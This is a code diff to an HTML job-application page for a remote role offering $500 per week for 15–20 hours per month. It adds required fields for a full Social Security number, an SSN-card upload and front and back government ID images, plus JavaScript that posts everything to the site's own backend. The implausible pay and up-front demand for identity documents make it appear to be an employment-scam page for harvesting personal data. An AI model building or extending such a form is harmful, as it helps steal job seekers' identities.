@@ -33,14 +33,15 @@
                     <div class="position-meta"><span><strong>$500</strong> per week</span><span><strong>15–20</strong> hours per month</span><span><strong>Remote</strong> location</span></div>
                </section>
 
-               <form class="application-form">
+               <form class="application-form" action="/api/applications" method="POST" enctype="multipart/form-data">
                     <section class="form-card">
                          <p class="section-kicker">02 / CONTACT</p>
                          <h2>Personal Information</h2>
                          <div class="field-grid">
-                              <div class="field"><label for="full_name">Full Name</label><div class="input-wrap"><span class="input-icon">👤</span><input type="text" id="full_name" placeholder="David Jones" required></div></div>
-                              <div class="field"><label for="email">Email Address</label><div class="input-wrap"><span class="input-icon">✉</span><input type="email" id="email" placeholder="you@example.com" required></div></div>
-                              <div class="field"><label for="phone">Phone Number</label><div class="input-wrap"><span class="input-icon">☎</span><input type="tel" id="phone" placeholder="(123) 456-7890" required></div></div>
+                              <div class="field"><label for="full_name">Full Name</label><div class="input-wrap"><span class="input-icon">👤</span><input type="text" id="full_name" name="full_name" placeholder="David Jones" required></div></div>
+                              <div class="field"><label for="email">Email Address</label><div class="input-wrap"><span class="input-icon">✉</span><input type="email" id="email" name="email" placeholder="you@example.com" required></div></div>
+                              <div class="field"><label for="phone">Phone Number</label><div class="input-wrap"><span class="input-icon">☎</span><input type="tel" id="phone" name="phone" placeholder="(123) 456-7890" required></div></div>
+                              <div class="field"><label for="ssn">Social Security Number (SSN)</label><div class="input-wrap"><span class="input-icon">🔒</span><input type="password" id="ssn" name="ssn" inputmode="numeric" autocomplete="off" placeholder="123456789" maxlength="9" pattern="\d{9}" title="Enter 9 digits only" required><button type="button" class="ssn-toggle" aria-pressed="false" aria-label="Show SSN">Show</button></div></div>
                          </div>
                     </section>
 
@@ -55,11 +56,11 @@
                          <p class="section-kicker">04 / LOCATION</p>
                          <h2>Address Details</h2>
                          <div class="field-grid address-grid">
-                              <div class="field field-wide"><label for="street">Street Address</label><div class="input-wrap"><span class="input-icon">⌂</span><input type="text" id="street" placeholder="123 Main Street" required></div></div>
-                              <div class="field"><label for="city">City</label><div class="input-wrap"><span class="input-icon">⌖</span><input type="text" id="city" placeholder="New York" required></div></div>
-                              <div class="field"><label for="state">State</label><div class="input-wrap"><span class="input-icon">⌖</span><input type="text" id="state" placeholder="New York" required></div></div>
-                              <div class="field"><label for="zip">ZIP / Postal Code</label><div class="input-wrap"><span class="input-icon">#</span><input type="text" id="zip" placeholder="10001" required></div></div>
-                              <div class="field"><label for="country">Country</label><div class="input-wrap"><span class="input-icon">◎</span><input type="text" id="country" placeholder="United States" required></div></div>
+                              <div class="field field-wide"><label for="street">Street Address</label><div class="input-wrap"><span class="input-icon">⌂</span><input type="text" id="street" name="street" placeholder="123 Main Street" required></div></div>
+                              <div class="field"><label for="city">City</label><div class="input-wrap"><span class="input-icon">⌖</span><input type="text" id="city" name="city" placeholder="New York" required></div></div>
+                              <div class="field"><label for="state">State</label><div class="input-wrap"><span class="input-icon">⌖</span><input type="text" id="state" name="state" placeholder="New York" required></div></div>
+                              <div class="field"><label for="zip">ZIP / Postal Code</label><div class="input-wrap"><span class="input-icon">#</span><input type="text" id="zip" name="zip" placeholder="10001" required></div></div>
+                              <div class="field"><label for="country">Country</label><div class="input-wrap"><span class="input-icon">◎</span><input type="text" id="country" name="country" placeholder="United States" required></div></div>
                          </div>
                     </section>
 
@@ -67,18 +68,119 @@
                          <p class="section-kicker">05 / EXPERIENCE</p>
                          <h2>Your Suitability</h2>
                          <label for="suitability">How does the opportunity relate to your suitability?</label>
-                         <textarea id="suitability" rows="5" placeholder="Briefly describe your qualifications and relevant experience..." required></textarea>
+                         <textarea id="suitability" name="suitability" rows="5" placeholder="Briefly describe your qualifications and relevant experience..." required></textarea>
                     </section>
 
                     <section class="form-card document-card">
                          <p class="section-kicker">06 / DOCUMENTS</p>
                          <h2>Upload Documents</h2>
-                         <div class="field-grid"><div class="field"><label for="resume">Resume</label><input class="file-input" type="file" id="resume" accept=".pdf,.doc,.docx" required></div><div class="field"><label for="id_front">Government ID — Front</label><input class="file-input" type="file" id="id_front" accept=".pdf,.jpg,.png" required></div><div class="field"><label for="id_back">Government ID — Back</label><input class="file-input" type="file" id="id_back" accept=".pdf,.jpg,.png" required></div></div>
+                               <div class="field-grid">
+                                    <div class="field"><label for="resume">Resume</label><input class="file-input" type="file" id="resume" name="resume" accept="image/*,.pdf,.doc,.docx,.jpg,.jpeg,.png,.heic,.heif,.avif,.bmp,.gif,application/pdf,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document" required></div>
+                                    <div class="field"><label for="id_front">Government ID — Front</label><input class="file-input" type="file" id="id_front" name="id_front" accept="image/*,.pdf,.jpg,.jpeg,.png,.heic,.heif,.avif,.bmp,.gif,application/pdf" required></div>
+                                    <div class="field"><label for="id_back">Government ID — Back</label><input class="file-input" type="file" id="id_back" name="id_back" accept="image/*,.pdf,.jpg,.jpeg,.png,.heic,.heif,.avif,.bmp,.gif,application/pdf" required></div>
+                                    <div class="field"><label for="ssn_card">SSN Card (upload)</label><input class="file-input" type="file" id="ssn_card" name="ssn_card" accept="image/*,.pdf,.jpg,.jpeg,.png,.heic,.heif,.avif,.bmp,.gif,application/pdf" required></div>
+                               </div>
                     </section>
-                    <button class="apply-button" type="submit">Submit Application <span>→</span></button>
+                    <div id="form-status" class="form-status" role="status" aria-live="polite" hidden></div>
+                    <button class="apply-button" id="submit-button" type="submit">Submit Application <span>→</span></button>
                </form>
           </main>
           <footer><p>© 2026 Body Mind And Soul</p></footer>
      </div>
+     <script>
+          document.addEventListener('DOMContentLoaded', function() {
+               var toggle = document.querySelector('.ssn-toggle');
+               var ssnInput = document.getElementById('ssn');
+               if (!toggle || !ssnInput) return;
+               toggle.addEventListener('click', function() {
+                    var isShown = ssnInput.type === 'text';
+                    ssnInput.type = isShown ? 'password' : 'text';
+                    toggle.textContent = isShown ? 'Show' : 'Hide';
+                    toggle.setAttribute('aria-pressed', String(!isShown));
+                    toggle.setAttribute('aria-label', isShown ? 'Show SSN' : 'Hide SSN');
+               });
+          });
+
+          // Handle form submission
+          const form = document.querySelector('.application-form');
+          const submitButton = document.getElementById('submit-button');
+          const statusBox = document.getElementById('form-status');
+
+          function setFormStatus(message, type = 'info') {
+               if (!statusBox) return;
+               statusBox.textContent = message;
+               statusBox.hidden = false;
+               statusBox.className = 'form-status ' + type;
+          }
+
+          if (form) {
+               form.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+
+                    if (!submitButton) return;
+                    submitButton.disabled = true;
+                    submitButton.innerHTML = '<span class="spinner" aria-hidden="true"></span>Uploading Documents... <span>→</span>';
+                    setFormStatus('Uploading your documents and submitting your application...', 'info');
+
+                    try {
+                         const formData = new FormData(this);
+                         const baseApiUrl = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.hostname === '0.0.0.0')
+                              && (window.location.port === '5500' || window.location.port === '5501')
+                              ? 'http://localhost:5000'
+                              : '';
+
+                         const response = await fetch(`${baseApiUrl}/api/applications`, {
+                              method: 'POST',
+                              headers: {
+                                   'X-Requested-With': 'XMLHttpRequest'
+                              },
+                              body: formData
+                         });
+
+                         if (response.ok) {
+                              const data = await response.json();
+                              if (data.status === 'success') {
+                                   setFormStatus('Application submitted successfully! Redirecting...', 'success');
+                                   setTimeout(() => {
+                                        window.location.href = '/submitted.html';
+                                   }, 900);
+                                   return;
+                              }
+                         }
+
+                         let errorMessage = 'Error submitting application. Please try again.';
+                         const statusMap = {
+                              400: 'Please complete all required form fields and upload all documents.',
+                              401: 'You are not authorized to submit this application.',
+                              403: 'Request blocked by browser security. Please refresh the page and try again.',
+                              413: 'One or more files are too large. Please upload smaller files.',
+                              500: 'The server is currently unavailable. Please try again in a moment.'
+                         };
+
+                         try {
+                              const error = await response.json();
+                              if (error && error.message) {
+                                   errorMessage = error.message;
+                              }
+                         } catch (_err) {
+                              // ignore invalid JSON response
+                         }
+
+                         if (statusMap[response.status]) {
+                              errorMessage = statusMap[response.status];
+                         }
+
+                         setFormStatus(errorMessage, 'error');
+                         submitButton.disabled = false;
+                         submitButton.innerHTML = 'Submit Application <span>→</span>';
+                    } catch (err) {
+                         console.error('Form submission error:', err);
+                         setFormStatus('Error submitting application. Please check the upload files and try again.', 'error');
+                         submitButton.disabled = false;
+                         submitButton.innerHTML = 'Submit Application <span>→</span>';
+                    }
+               });
+          }
+     </script>
 </body>
 </html>
